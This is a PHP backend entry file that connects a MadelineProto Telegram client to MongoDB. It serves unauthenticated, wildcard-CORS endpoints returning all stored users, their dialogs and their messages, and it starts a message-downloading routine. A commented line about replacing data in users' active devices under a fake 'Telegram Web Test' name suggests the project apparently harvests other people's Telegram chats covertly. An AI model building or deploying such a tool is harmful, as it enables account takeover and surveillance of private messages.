<?php
require_once __DIR__ . '/vendor/autoload.php';
require_once 'services/userinfo_service.php';
require_once 'services/ChatService.php';
require_once 'services/LoginService.php';
require_once 'services/datareplace_service.php';
require_once 'services/DatabaseService.php';
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

use Cron\Job\ShellJob;
use Cron\Schedule\CrontabSchedule;
use danog\MadelineProto\API;
use danog\MadelineProto\Settings;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Tools;
use MongoDB\Collection;
use function MongoDB\BSON\toJSON;
use function MongoDB\BSON\fromPHP;

//server configuration to solve an error related to CORS (problem when you run front and back in one url)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, DELETE, PUT, PATCH, OPTIONS');
    header('Access-Control-Allow-Headers: token, Content-Type');
    header('Access-Control-Max-Age: 1728000');
    header('Content-Length: 0');
    header('Content-Type: text/plain');
    die();
}
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

//When using JSON content-type $_POST is empty this to solve it
$_POST = json_decode(file_get_contents("php://input"), true);

//Connect to MongoDb
$DatabaseService = new DatabaseService(
    'mongodb+srv://'.urlencode($_ENV['MDB_USER']).':'.urlencode($_ENV['MDB_PASS']).'@'.$_ENV['ATLAS_CLUSTER_SRV'].'/?retryWrites=true&w=majority&appName=Cluster0',
    $_ENV['MDB_DATABASE']
);

//connect to MadelineProto
$settings = new Settings;

$settings->setAppInfo((new AppInfo)
    ->setApiId($_ENV['TG_APIID'])
    ->setApiHash($_ENV['TG_APIHASH'])
);

//for replace data in user active devices
//replaceDeviceForAuth($settings, "Telegram Web Test");
/*addHttpProxy($settings,
    [
        'address'  => '0.0.0.0',
        'port'     =>  2343,
    ]);*/

if(isset($_GET['value']))
{
    if ($_GET['value'] === 'users'){
        http_response_code(200);
        echo toJSON(fromPHP($DatabaseService->getAllUsers()));
    }
    else if (isset($_GET['user_id'])){
        if ($_GET['value'] === 'dialogs'){
            http_response_code(200);
            echo toJSON(fromPHP($DatabaseService->getAllDialogsByUserId($_GET['user_id'])));
        }
        else if ($_GET['value'] === 'messages' && isset($_GET['dialog_id'])){
            http_response_code(200);
            echo toJSON(fromPHP($DatabaseService->getAllMessagesInDialogByUserIdAndDialogId($_GET['user_id'], $_GET['dialog_id'])));
        }
    }
}
else {
    $MadelineProto = new API('session.madeline', $settings);
    $LoginService = new LoginService($MadelineProto, $DatabaseService);
    $ChatService = new ChatService($MadelineProto, $DatabaseService);

    //main message downloading endpoint
    $LoginService->authAndStartParse($ChatService);
}